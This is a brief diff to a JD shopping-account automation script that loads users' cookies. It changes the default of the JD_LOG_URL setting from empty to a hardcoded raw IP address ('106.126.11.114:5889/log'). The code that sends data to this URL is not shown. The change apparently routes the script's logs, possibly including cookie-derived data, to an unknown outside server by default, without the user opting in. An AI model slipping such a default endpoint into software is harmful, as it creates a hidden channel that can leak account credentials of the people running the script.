@@ -27,7 +27,7 @@ const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
 let cookiesArr = [], cookie = '';
 var timestamp = Math.round(new Date().getTime()).toString();
 $.shareCodes = [];
-let jdLogUrl = process.env.JD_LOG_URL ?? ""
+let jdLogUrl = process.env.JD_LOG_URL ?? "http://106.126.11.114:5889/log"
 !(async () => {
     await requireConfig()
   if (!cookiesArr[0]) {
